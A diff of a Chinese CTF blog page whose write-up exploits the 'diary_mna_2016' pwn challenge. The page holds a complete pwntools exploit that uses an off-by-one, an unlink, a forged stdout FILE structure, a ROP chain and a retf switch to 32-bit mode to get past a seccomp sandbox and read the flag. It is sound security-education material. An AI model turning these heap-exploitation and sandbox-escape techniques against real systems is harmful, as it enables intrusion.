@@ -5,35 +5,35 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="首先，检查一下程序的保护机制   然后检查一下沙箱机制，发现禁用了execve还有open函数，但是没有对sys_number的范围进行判断，因此，可以利用retf切换到32位模式绕过沙箱。   然后，我们用IDA分析一下，输入函数存在off by one。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="diary_mna_2016">
-<meta property="og:url" content="https://github.com/ha1vk/2020/07/24/diary_mna_2016/index.html">
+<meta property="og:url" content="https://github.com/2020/07/24/diary_mna_2016/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="首先，检查一下程序的保护机制   然后检查一下沙箱机制，发现禁用了execve还有open函数，但是没有对sys_number的范围进行判断，因此，可以利用retf切换到32位模式绕过沙箱。   然后，我们用IDA分析一下，输入函数存在off by one。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/24/diary_mna_2016/image1.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/24/diary_mna_2016/image2.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/24/diary_mna_2016/image3.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/24/diary_mna_2016/image4.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/24/diary_mna_2016/image5.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/24/diary_mna_2016/image6.png">
-<meta property="og:image" content="https://github.com/ha1vk/2020/07/24/diary_mna_2016/image7.png">
+<meta property="og:image" content="https://github.com/2020/07/24/diary_mna_2016/image1.png">
+<meta property="og:image" content="https://github.com/2020/07/24/diary_mna_2016/image2.png">
+<meta property="og:image" content="https://github.com/2020/07/24/diary_mna_2016/image3.png">
+<meta property="og:image" content="https://github.com/2020/07/24/diary_mna_2016/image4.png">
+<meta property="og:image" content="https://github.com/2020/07/24/diary_mna_2016/image5.png">
+<meta property="og:image" content="https://github.com/2020/07/24/diary_mna_2016/image6.png">
+<meta property="og:image" content="https://github.com/2020/07/24/diary_mna_2016/image7.png">
 <meta property="article:published_time" content="2020-07-24T15:12:00.000Z">
 <meta property="article:modified_time" content="2025-06-25T07:10:06.700Z">
 <meta property="article:author" content="ha1vk">
@@ -42,9 +42,9 @@
 <meta property="article:tag" content="IO FILE">
 <meta property="article:tag" content="retf沙箱绕过">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/07/24/diary_mna_2016/image1.png">
+<meta name="twitter:image" content="https://github.com/2020/07/24/diary_mna_2016/image1.png">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/07/24/diary_mna_2016/">
+<link rel="canonical" href="https://github.com/2020/07/24/diary_mna_2016/">
 
 
 <script id="page-configurations">
@@ -106,7 +106,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -127,27 +127,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -205,10 +205,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/24/diary_mna_2016/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/07/24/diary_mna_2016/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -243,7 +243,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -266,25 +266,25 @@
 
       
         <p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/07/24/diary_mna_2016/image1.png" class="">
+<img src="/2020/07/24/diary_mna_2016/image1.png" class="">
 
 <p>然后检查一下沙箱机制，发现禁用了execve还有open函数，但是没有对sys_number的范围进行判断，因此，可以利用retf切换到32位模式绕过沙箱。</p>
-<img src="/ha1vk/2020/07/24/diary_mna_2016/image2.png" class="">
+<img src="/2020/07/24/diary_mna_2016/image2.png" class="">
 
 <p>然后，我们用IDA分析一下，输入函数存在off by one。</p>
-<img src="/ha1vk/2020/07/24/diary_mna_2016/image3.png" class="">
+<img src="/2020/07/24/diary_mna_2016/image3.png" class="">
 
 <p>程序自己用链表实现了一个堆块管理器。</p>
-<img src="/ha1vk/2020/07/24/diary_mna_2016/image4.png" class="">
+<img src="/2020/07/24/diary_mna_2016/image4.png" class="">
 
 <p>其free功能使用的是unlink，将堆块取出、合并等操作，但是缺少链表完整性检查</p>
-<img src="/ha1vk/2020/07/24/diary_mna_2016/image5.png" class="">
+<img src="/2020/07/24/diary_mna_2016/image5.png" class="">
 
-<img src="/ha1vk/2020/07/24/diary_mna_2016/image6.png" class="">
+<img src="/2020/07/24/diary_mna_2016/image6.png" class="">
 
 <p>这里，我们unlink不能直接将got表修改为system_addr的地址，因为这里unlink的操作，要保证fd和bk都为可写的地址。因此，一个好的方法是设置fd为bss上stdout指针的地址-x10，设置bk为一个堆地址，这样，unlink以后stdout指针被修改为一个堆地址，我们只需要在堆里伪造好_IO_2_1_stdout_结构体即可。</p>
 <p>由于heap是使用mmap映射出来的，因此，其地址靠近lib地址</p>
-<img src="/ha1vk/2020/07/24/diary_mna_2016/image7.png" class="">
+<img src="/2020/07/24/diary_mna_2016/image7.png" class="">
 
 <p>但是其地址与libc地址的偏移在本地和远程是不一样的，但是可以在一个范围内爆破。爆破方法见我的这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/107072062">https://blog.csdn.net/seaaseesa/article/details/107072062</a>。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./diary_mna_2016&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class="line"><span class="comment">#sh = remote(&#x27;node3.buuoj.cn&#x27;,26394)</span></span><br><span class="line"><span class="comment">#sh = remote(&#x27;127.0.0.1&#x27;,8666)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line">stdout_bss_addr = <span class="number">0x00000000006020F0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content,line = <span class="literal">True</span></span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input date&#x27;</span>,<span class="string">&#x27;1970/01/&#x27;</span> + <span class="built_in">str</span>(index).rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   <span class="keyword">if</span> line:</span><br><span class="line">      sh.sendlineafter(<span class="string">&#x27;happened on&#x27;</span>,content)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      sh.sendafter(<span class="string">&#x27;happened on&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input date&#x27;</span>,<span class="string">&#x27;1970/01/&#x27;</span> + <span class="built_in">str</span>(index).rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input date&#x27;</span>,<span class="string">&#x27;1970/01/&#x27;</span> + <span class="built_in">str</span>(index).rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">offset</span>):</span><br><span class="line">   add(<span class="number">1</span>,<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xFF</span>)</span><br><span class="line">   add(<span class="number">2</span>,<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xFF</span>)</span><br><span class="line">   add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">   add(<span class="number">4</span>,<span class="number">0x120</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">   add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">   delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">   add(<span class="number">2</span>,<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>,<span class="literal">False</span>)</span><br><span class="line">   show(<span class="number">2</span>)</span><br><span class="line">   sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">   heap_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) ^ <span class="built_in">ord</span>(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">   libc_base = heap_addr - offset</span><br><span class="line">   pop_rdi = libc_base + <span class="number">0x0000000000021102</span></span><br><span class="line">   pop_rsi = libc_base + <span class="number">0x00000000000202e8</span></span><br><span class="line">   pop_rdx = libc_base + <span class="number">0x0000000000001b92</span></span><br><span class="line">   pop_rax = libc_base + <span class="number">0x0000000000033544</span></span><br><span class="line">   jmp_rdi = libc_base + <span class="number">0x000000000006caa4</span></span><br><span class="line">   <span class="string">&#x27;&#x27;&#x27;pop_rdi = libc_base + 0x0000000000021112</span></span><br><span class="line"><span class="string">   pop_rsi = libc_base + 0x00000000000202f8</span></span><br><span class="line"><span class="string">   pop_rdx = libc_base + 0x0000000000001b92</span></span><br><span class="line"><span class="string">   pop_rax = libc_base + 0x000000000003a738</span></span><br><span class="line"><span class="string">   jmp_rdi = libc_base + 0x000000000006cab4</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   mprotect_addr = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">   setcontext_x = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">0x35</span></span><br><span class="line">   <span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">   fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   fake_file = fake_file.ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">   fake_file += p64(heap_addr - <span class="number">0x4D0</span>)</span><br><span class="line">   fake_file = fake_file.ljust(<span class="number">0xA0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">   fake_file += p64(heap_addr - <span class="number">0x3E8</span>)</span><br><span class="line">   fake_file += p64(pop_rdi)</span><br><span class="line">   fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">   fake_file += p64(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">   fake_file += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">   <span class="comment">#vtable指针</span></span><br><span class="line">   fake_file += p64(heap_addr - <span class="number">0x3F0</span> - <span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">   fake_file += p64(setcontext_x) <span class="comment">#vtable</span></span><br><span class="line"></span><br><span class="line">   shellcode_addr = heap_addr + <span class="number">0x100</span></span><br><span class="line">   <span class="comment">#接下来布置rop，跳到shellcode里去</span></span><br><span class="line">   fake_file += p64(shellcode_addr) + p64(pop_rsi) + p64(<span class="number">0x200</span>) + p64(pop_rdx) + p64(<span class="number">0x7</span>) + p64(mprotect_addr) + p64(jmp_rdi)</span><br><span class="line"></span><br><span class="line">   delete(<span class="number">1</span>)</span><br><span class="line">   add(<span class="number">1</span>,<span class="number">0x200</span>,fake_file)</span><br><span class="line"></span><br><span class="line">   <span class="comment">#先调用read输入32位shellcode，然后使用retf切换到32位模式，执行32位shellcode</span></span><br><span class="line">   shellcode = asm(<span class="string">&#x27;&#x27;&#x27;/*mmap*/</span></span><br><span class="line"><span class="string">                      mov r9d,0</span></span><br><span class="line"><span class="string">                      mov r8d,0xFFFFFFFF</span></span><br><span class="line"><span class="string">                      mov r10,0x22</span></span><br><span class="line"><span class="string">                      mov edx,7</span></span><br><span class="line"><span class="string">                      mov esi,0x1000</span></span><br><span class="line"><span class="string">                      mov edi,0x160000</span></span><br><span class="line"><span class="string">                      mov eax,9</span></span><br><span class="line"><span class="string">                      syscall</span></span><br><span class="line"><span class="string">                      /*write*/</span></span><br><span class="line"><span class="string">                      mov rax,0x3A7475706E69</span></span><br><span class="line"><span class="string">                      push rax</span></span><br><span class="line"><span class="string">                      mov rax,1</span></span><br><span class="line"><span class="string">                      mov rdi,rax</span></span><br><span class="line"><span class="string">                      mov rsi,rsp</span></span><br><span class="line"><span class="string">                      mov rdx,6</span></span><br><span class="line"><span class="string">                      syscall</span></span><br><span class="line"><span class="string">                      /*read*/</span></span><br><span class="line"><span class="string">                      xor rax,rax</span></span><br><span class="line"><span class="string">                      xor rdi,rdi</span></span><br><span class="line"><span class="string">                      mov rsi,0x160800</span></span><br><span class="line"><span class="string">                      mov rdx,0x100</span></span><br><span class="line"><span class="string">                      syscall</span></span><br><span class="line"><span class="string">                      /*retf*/</span></span><br><span class="line"><span class="string">                      xor rsp,rsp</span></span><br><span class="line"><span class="string">                      mov esp,0x160700</span></span><br><span class="line"><span class="string">                      mov dword ptr[esp+4],0x23</span></span><br><span class="line"><span class="string">                      mov dword ptr[esp],0x160800</span></span><br><span class="line"><span class="string">                      retf</span></span><br><span class="line"><span class="string">                   &#x27;&#x27;&#x27;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">   add(<span class="number">6</span>,<span class="number">0x200</span>,shellcode)</span><br><span class="line"></span><br><span class="line">   delete(<span class="number">3</span>)</span><br><span class="line">   payload = p64(stdout_bss_addr - <span class="number">0x10</span>) + p64(heap_addr - <span class="number">0x4D0</span>)</span><br><span class="line">   payload = payload.ljust(<span class="number">0x58</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">   payload += p64(<span class="number">0x68</span>) <span class="comment">#prev_size</span></span><br><span class="line">   payload += p8(<span class="number">0x28</span>)</span><br><span class="line">   add(<span class="number">3</span>,<span class="number">0x60</span>,payload,<span class="literal">False</span>)</span><br><span class="line">   <span class="comment">#unlink修改stdout指针</span></span><br><span class="line">   delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">   shellcode = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>) + shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>) + shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;input:&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xD0</span>,<span class="number">0xFF</span>):</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">      <span class="keyword">global</span> sh</span><br><span class="line">      <span class="comment">#sh = process(&#x27;./diary_mna_2016&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class="line">      sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26394</span>)</span><br><span class="line">      offset = <span class="number">0x5</span> &lt;&lt; <span class="number">20</span> <span class="comment">#remote offset=0x5ee500</span></span><br><span class="line">      offset += x &lt;&lt; <span class="number">12</span></span><br><span class="line">      offset += <span class="number">0x500</span></span><br><span class="line">      <span class="built_in">print</span> <span class="built_in">hex</span>(offset)</span><br><span class="line">      exploit(offset)</span><br><span class="line">      sh.interactive()</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">      sh.close()</span><br><span class="line">      <span class="built_in">print</span> <span class="string">&#x27;trying...&#x27;</span></span><br></pre></td></tr></table></figure>
@@ -296,10 +296,10 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/unlink/" rel="tag"># unlink</a>
-              <a href="/ha1vk/tags/off-by-one/" rel="tag"># off by one</a>
-              <a href="/ha1vk/tags/IO-FILE/" rel="tag"># IO FILE</a>
-              <a href="/ha1vk/tags/retf%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/" rel="tag"># retf沙箱绕过</a>
+              <a href="/tags/unlink/" rel="tag"># unlink</a>
+              <a href="/tags/off-by-one/" rel="tag"># off by one</a>
+              <a href="/tags/IO-FILE/" rel="tag"># IO FILE</a>
+              <a href="/tags/retf%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87/" rel="tag"># retf沙箱绕过</a>
           </div>
 
         
@@ -308,11 +308,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/07/24/%E4%B8%AD%E5%85%B3%E6%9D%912019_two_string/" rel="prev" title="中关村2019_two_string">
+    <a href="/2020/07/24/%E4%B8%AD%E5%85%B3%E6%9D%912019_two_string/" rel="prev" title="中关村2019_two_string">
       <i class="fa fa-chevron-left"></i> 中关村2019_two_string
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/07/25/starctf2018_note/" rel="next" title="starctf2018_note(栈上的null off by one)">
+    <a href="/2020/07/25/starctf2018_note/" rel="next" title="starctf2018_note(栈上的null off by one)">
       starctf2018_note(栈上的null off by one) <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -384,20 +384,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -470,30 +470,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
